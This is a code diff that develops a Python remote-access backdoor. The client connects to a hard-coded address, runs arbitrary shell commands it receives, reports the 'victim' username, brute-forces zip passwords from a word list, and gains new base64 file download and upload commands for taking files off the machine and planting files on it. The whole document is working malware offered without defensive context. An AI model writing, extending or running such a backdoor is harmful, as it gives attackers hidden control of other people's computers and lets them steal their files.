@@ -1,15 +1,17 @@
 import socket
-import zipfile
+import threading
 import os
+import zipfile
 import time
 import pickle
 import subprocess
 import getpass
 import inspect
-from functools import wraps
 import queue
-import threading
 import signal
+from functools import wraps
+import base64
+import json
 
 def check_file(zip_file=None, word_list=None):
 	combine_dir = None
@@ -26,8 +28,9 @@ def check_file(zip_file=None, word_list=None):
 					if not os.path.isfile(combine_dir):
 						return False
 	return combine_dir
+					
 
-def verify_files(function):
+def verify_file(function):
 	@wraps(function)
 	def inside(zip_file, word_list):
 		check_zip = check_file(zip_file=zip_file)
@@ -37,7 +40,7 @@ def verify_files(function):
 		return function(check_zip, check_word_list)
 	return inside
 
-@verify_files
+@verify_file
 class ZipFile:
 	def __init__(self, zip_file, word_list):
 		self.zip_file = zip_file
@@ -60,7 +63,7 @@ class ZipFile:
 			zip_file.extractall(pwd=password)
 			self.password = password.decode()
 			self.end_thread = True
-			return
+			return 
 		except Exception:
 			pass
 
@@ -81,15 +84,14 @@ class ZipFile:
 
 					if self.q.empty():
 						with self.q.mutex:
-							self.queue.clear()
+							self.q.queue.clear()
 							continue
 
 					if self.end_thread:
 						return f"[+] Got password -> {self.password}"
-		return f"[-] Couldn't get password with {str(count)} attempts"
+		return f"[-] Couldnt get password with {str(count)} attempts"
 
-
-class Socket:
+class Client:
 	def __init__(self):
 		self.get_dict = self.dict_arguments()
 		self.ip = "10.0.2.15"
@@ -104,22 +106,23 @@ class Socket:
 		self.start_connection()
 
 	def reliable_send(self, data):
-		if isinstance(data, list):
-			data_list = pickle.dumps(data)
-		else:
-			data_list = data
-			data_list = data_list.encode()
-		self.connection.send(data_list)
+		data_list = json.dumps(data)
+		return self.socket_connection.send(data_list.encode())
+
+	def reliable_recieve(self):
+		json_data = b""
+		while True:
+			try:
+				json_data += self.socket_connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
 
 	def victim_username(self):
 		return getpass.getuser()
 
-	def print_current_directory(self):
-		return os.getcwd()
-
-	def change_directory(self, directory):
-		os.chdir(directory[1])
-		return os.getcwd()
+	def check_output(self, command):
+		return subprocess.check_output(command, shell=True).decode()
 
 	def check_zip_file(self):
 		my_list = []
@@ -131,14 +134,29 @@ class Socket:
 					my_list.append(combine_file)
 		return my_list
 
-	def check_output(self, command):
-		return subprocess.check_output(command, shell=True).decode()
-
 	def brute_force_zip_file(self, password):
 		start_brute = ZipFile(password[1], password[2])
 		if not hasattr(start_brute, 'zip_file') or not hasattr(start_brute, 'word_list'):
 			return f"[-] Invalid File {password[1]} : {password[2]}"
 		return start_brute.brute_force_zip()
+
+	def download_file(self, file):
+		file_result = check_file(word_list=file[1])
+		if not file_result:
+			return "[-] Invalid File"
+
+		with open(file_result, "rb") as f:
+			data = f.read()
+			f.close()
+		encode = base64.b64encode(data).decode("ascii")
+		return encode
+
+	def upload_file(self, file):
+		decode = base64.b64decode(file[2])
+		with open(file[1], "wb") as f:
+			f.write(decode)
+			f.close()
+		return "[+] File uploaded"
 
 	def dict_arguments(self):
 		return {
@@ -146,32 +164,40 @@ class Socket:
 			"cd": self.change_directory,
 			"listdir": self.print_current_directory,
 			"clear": self.clear,
-			"brute": self.brute_force_zip_file
+			"brute": self.brute_force_zip_file,
+			"download": self.download_file,
+			"upload": self.upload_file
 		}
-
-	def get_dict_args(self, data, *args):
-		return self.get_dict[data](*args)
 
 	def clear(self):
 		return "[+] Cleared"
 
-	def start_connection(self):
-		print("[+] Connected")  
+	def print_current_directory(self):
+		return os.getcwd()
 
+	def change_directory(self, directory):
+		os.chdir(directory[1])
+		return os.getcwd()
+
+	def return_func(self, data, *args):
+		return self.get_dict[data](*args)
+
+	def start_connection(self):
+		print("[+] Connected")
 		while True:
 			try:
-				data = pickle.loads(self.socket_connection.recv(4096))
-				if data[0] in self.get_dict:
-					if len(inspect.getfullargspec(self.get_dict[data[0]])[0]) > 1:
-						command = self.get_dict_args(data[0], data)
+				self.data = self.reliable_recieve()
+				if self.data[0] in self.get_dict:
+					if len(inspect.getfullargspec(self.get_dict[self.data[0]])[0]) > 1:
+						command = self.return_func(self.data[0], self.data)
 					else:
-						command = self.get_dict_args(data[0])
+						command = self.return_func(self.data[0])
 				else:
-					command = self.check_output(data)
-			except Exception:
+					command = self.check_output(self.data)
+			except Exception as e:
+				print(e)
 				command = "[!] Error"
 			self.reliable_send(command)
 
-
 if __name__ == '__main__':
-	Socket()
+	Client()
